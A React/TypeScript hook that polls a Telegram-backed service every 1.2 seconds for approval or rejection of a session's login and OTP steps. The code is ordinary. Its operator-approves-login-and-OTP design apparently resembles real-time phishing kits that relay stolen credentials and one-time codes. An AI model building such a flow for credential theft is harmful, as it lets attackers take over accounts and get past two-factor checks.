import { useState, useEffect, useRef } from 'react';
import { telegramService } from '../services/telegramService';

interface UseTelegramPollingProps {
  sessionId: string | null;
  targetStep: 'login' | 'otp';
  isActive: boolean;
  onApproved: () => void;
  onRejected: () => void;
}

export function useTelegramPolling({
  sessionId,
  targetStep,
  isActive,
  onApproved,
  onRejected,
}: UseTelegramPollingProps) {
  const [status, setStatus] = useState<'idle' | 'pending' | 'approved' | 'rejected'>('idle');
  const [error, setError] = useState<string | null>(null);
  const intervalRef = useRef<any>(null);
  const isFinishedRef = useRef(false);

  useEffect(() => {
    if (!isActive || !sessionId) {
      if (intervalRef.current) clearInterval(intervalRef.current);
      isFinishedRef.current = false;
      return;
    }

    setStatus('pending');
    setError(null);
    isFinishedRef.current = false;

    const checkStatus = async () => {
      if (isFinishedRef.current) return;
      try {
        const result = await telegramService.pollUpdates(sessionId, targetStep);

        if (result === 'approved') {
          isFinishedRef.current = true;
          setStatus('approved');
          if (intervalRef.current) clearInterval(intervalRef.current);
          onApproved();
        } else if (result === 'rejected') {
          isFinishedRef.current = true;
          setStatus('rejected');
          if (intervalRef.current) clearInterval(intervalRef.current);
          onRejected();
        }
      } catch (err: any) {
        // Safe catch without throwing
        console.warn('Polling status check:', err);
      }
    };

    // Immediate check + fast 1.2s polling for instant feedback
    checkStatus();
    intervalRef.current = setInterval(checkStatus, 1200);

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [sessionId, isActive, targetStep, onApproved, onRejected]);

  return {
    status,
    error,
  };
}
